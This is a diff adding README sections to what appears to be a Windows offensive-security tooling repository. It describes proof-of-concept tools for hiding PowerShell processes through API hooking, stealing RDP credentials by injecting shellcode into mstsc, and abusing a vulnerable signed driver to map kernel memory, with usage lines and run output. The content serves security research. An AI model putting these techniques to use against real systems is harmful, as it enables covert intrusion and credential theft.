@@ -303,7 +303,222 @@ C:\> UrbanBishop.exe -i 3380 -p C:\Users\b33f\Desktop\sc.bin -c
     |-> NtUnmapViewOfSection
 ```
 
+### AtomicBird
+
+AtmoicBird, is a crude POC to demo the use of [EasyHook](https://easyhook.github.io/) in .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. AtomicBird has two functions, (1) Hook MessageBoxA => print to console / modify parameters => unhook and (2) Hook NtQuerySystemInformation->SystemProcessInformation, search the linked list of SYSTEM_PROCESS_INFORMATION Structs to find powershell processes and unlink them. The second function requires that you inject the .Net PE into a process that uses NtQuerySystemInformation (Process Explorer was used for testing), you can do that with execute-assembly or with donut by generating shellcode. AtmoicBird was only tested on x64 Win10.
+
+```
+
+              .---.        .-----------
+             /     \  __  /    ------
+            / /     \(  )/    -----  Atomic
+           //////   ' \/ `   ---       Bird
+          //// / // :    : ---
+         // /   /  /`    '--
+        //          //..\\      ~b33f~
+               ====UU====UU====
+                   '//||\\`
+                     ''``
+Called ==> SystemProcessInformation
+Called ==> SystemProcessInformation
+Called ==> SystemProcessInformation
+Called ==> SystemProcessInformation
+Called ==> SystemProcessInformation
+[!] Found Powershell => rewriting linked list
+Called ==> SystemProcessInformation
+[!] Found Powershell => rewriting linked list
+Called ==> SystemProcessInformation
+[!] Found Powershell => rewriting linked list
+Called ==> SystemProcessInformation
+[!] Found Powershell => rewriting linked list
+Called ==> SystemProcessInformation
+[!] Found Powershell => rewriting linked list
+[!] Found Powershell => rewriting linked list
+
+[...Snipped...]
+```
+
+### RemoteViewing
+
+RemoteViewing, is quick POC to demo RDP credential theft through API hooking using [EasyHook](https://easyhook.github.io/) for .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. This is adapted from a post by [@0x09AL](https://twitter.com/0x09AL) that you can read [here](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/). To use this you have to compile RemoteViewing and then turn it into shellcode with [Donut](https://github.com/TheWover/donut) after which you have to inject that shellcode into mstsc. RemoteViewing will RC2 encrypt any credentials it captures and write them to disk. You can then use Clairvoyant to decrypt the file in memory, read out the results and delete the file.
+
+### Londor
+
+Londor is a small toolkit which wraps [frida-clr](https://github.com/frida/frida). I initially wanted to create a tool which would allow you to generate DynamoRIO coverage files but I also ported some code from [Fermion](https://github.com/FuzzySecurity/Fermion) to provide some more generic JScript injection capabilities. Note: There are some color palette bugs in Londor that I left unfixed (not my problem & does not affect usability) so if you use it in different terminal flavors you will see some wacky color combos. I may return to this at some point when I have ∆-freeTime.
+
+```
+C:\> Londor.exe
+    __              _
+   |  |   ___ ___ _| |___ ___
+   |  |__| . |   | . | . |  _|
+   |_____|___|_|_|___|___|_|
+
+                         ~b33f
+
+
+  >--~~--> Args? <--~~--<
+
+ --help   (-h)    Show this help message.
+ --type   (-t)    Instrumentation type: Coverage, Script.
+ --out    (-o)    Full output path for DRCOV file.
+ --path   (-p)    Full path to JS script.
+ --pid    (-pid)  PID of the process to attach to.
+ --name   (-n)    Substring name of process to attach to.
+ --start  (-s)    Full path to binary to launch.
+ --args   (-a)    Args to pass to binary.
+
+  >--~~--> Usage? <--~~--<
+
+
+ # Generate coverage information for a process
+ Londor.exe -t Coverage -pid 123 -o C:\Some\Out\Path.drcov
+ Londor.exe -t Coverage -n notepad -o C:\Some\Out\Path.drcov
+ Londor.exe -t Coverage -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -o C:\Some\Out\Path.drcov
+
+ # Inject JS script into process
+ Londor.exe -t Script -pid 123 -p C:\Some\Path\To\Script.js
+ Londor.exe -t Script -n notepad -p C:\Some\Path\To\Script.js
+ Londor.exe -t Script -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -p C:\Some\Path\To\Script.js
+ 
+
+C:\> Londor.exe -t Coverage -s "C:\Windows\System32\notepad.exe" -o C:\Users\b33f\Desktop\test.drcov -a "C:\Users\b33f\Desktop\bla.txt"
+    __              _
+   |  |   ___ ___ _| |___ ___
+   |  |__| . |   | . | . |  _|
+   |_____|___|_|_|___|___|_|
+
+                         ~b33f
+
+
+[>] Spawning process for coverage..
+    |-> PID: 5260; Path: C:\Windows\System32\notepad.exe
+    |-> Script loaded
+
+[*] Press ctrl-c to detach..
+
+[+] Block trace Length: 107160
+    |-> BBS slice: 13395; Total BBS: 13395
+[+] Block trace Length: 18456
+    |-> BBS slice: 2307; Total BBS: 15702
+[+] Block trace Length: 76032
+    |-> BBS slice: 9504; Total BBS: 25206
+[+] Block trace Length: 22216
+    |-> BBS slice: 2777; Total BBS: 27983
+[+] Block trace Length: 20248
+    |-> BBS slice: 2531; Total BBS: 30514
+[+] Block trace Length: 32
+    |-> BBS slice: 4; Total BBS: 30518
+
+[?] Unloading hooks, please wait..
+    |-> Wrote trace data to file
+```
+
+### VirtToPhys
+
+VirtToPhys is a small POC to demonstrate how you can calculate the physical address for a kernel virtual address when exploiting driver bugs that allow you to map physical memory. VirtToPhys uses MsIo.sys, a WHQL signed driver that gives you colorful lights on your RAM (?lolwut), [CVE-2019-18845](https://github.com/active-labs/Advisories/blob/master/2019/ACTIVE-2019-012.md). Hat tips and full credits to [@UlfFrisk](https://twitter.com/UlfFrisk) for his very insightful [MemProcFS](https://github.com/ufrisk/MemProcFS) project and [@hFireF0X](https://twitter.com/hFireF0X) for [KDU](https://github.com/hfiref0x/KDU).
+
+```
+C:\> VirtToPhys.exe -l
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] Loading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[>] Driver Nt path: \??\C:\Windows\System32\MsIo64.sys
+[>] Driver registration: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsIoTest
+[?] NtLoadDriver -> Success
+[+] Driver load: OK
+
+C:\> VirtToPhys.exe -v 0xffffd20fc9a5f440
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[*] MsIO driver handle: 604
+[?] Leaking PML4..
+[+] PML4 in lowstub --> 1AB000
+[?] Converting VA -> PA
+    |-> PhysAddress: 7E25F440
+
+C:\> VirtToPhys.exe -u
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] UnLoading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[+] NtUnloadDriver -> Success
+[+] Driver deleted from disk
+[+] Driver service artifacts deleted
+[?] Driver unload: OK
+```
+
 ## Windows API
+
+### GetAPISetMapping
+
+This project parses the PEB to match Windows API Set DLL's to their host DLL. This code is adapted from [Lunar](https://github.com/Dewera/Lunar/) by [@fakedewera](https://twitter.com/fakedewera).
+
+```
+C:\> GetAPISetMapping.exe
+ >--~~--> Args? <--~~--<
+
+-List   (-l)       Boolean: List all know API Set mappings.
+-Search (-s)       String: Perform string match based on partial or full API Set name.
+
+ >--~~--> Usage? <--~~--<
+
+GetAPISetMapping.exe -l
+GetAPISetMapping.exe -s "api-ms-win-appmodel-state-l1-2-0.dll"
+
+C:\> GetAPISetMapping.exe -s "win-dx-d3dkmt"
+API Set: api-ms-win-dx-d3dkmt-l1-1-5.dll  -->  gdi32.dll
+API Set: ext-ms-win-dx-d3dkmt-dxcore-l1-1-0.dll  -->  dxcore.dll
+API Set: ext-ms-win-dx-d3dkmt-gdi-l1-1-0.dll  -->  gdi32.dll
+
+C:\> GetAPISetMapping.exe -l
+API Set: api-ms-onecoreuap-print-render-l1-1-0.dll  -->  printrenderapihost.dll
+API Set: api-ms-win-appmodel-identity-l1-2-0.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-appmodel-runtime-internal-l1-1-6.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-appmodel-runtime-l1-1-3.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-appmodel-state-l1-1-2.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-appmodel-state-l1-2-0.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-appmodel-unlock-l1-1-0.dll  -->  kernel.appcore.dll
+API Set: api-ms-win-base-bootconfig-l1-1-0.dll  -->  advapi32.dll
+API Set: api-ms-win-base-util-l1-1-0.dll  -->  advapi32.dll
+API Set: api-ms-win-composition-redirection-l1-1-0.dll  -->  dwmredir.dll
+API Set: api-ms-win-composition-windowmanager-l1-1-0.dll  -->  udwm.dll
+API Set: api-ms-win-containers-cmclient-l1-1-1.dll  -->  cmclient.dll
+
+[...Snipped...]
+```
 
 ### SystemProcessAndThreadsInformation
 
